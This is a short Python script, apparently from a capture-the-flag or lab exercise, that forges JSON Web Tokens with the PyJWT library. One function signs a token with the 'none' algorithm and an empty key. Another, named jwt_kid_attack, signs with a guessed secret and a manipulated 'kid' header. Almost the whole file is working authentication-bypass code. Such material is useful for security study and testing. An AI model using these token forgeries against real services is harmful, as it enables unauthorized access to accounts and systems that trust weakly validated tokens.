import jwt


def jwt_test():
    print(jwt.encode({"101190":"eb54838bb2d89dfcab1b08e3e96945f1"}, key="", algorithm="none"))

def jwt_kid_attack():
    print(jwt.encode({"101190":"eb54838bb2d89dfcab1b08e3e96945f1"}, key="xxx", algorithm='HS256', headers={"kid": "123456"}))

if __name__ == '__main__':
    jwt_kid_attack()
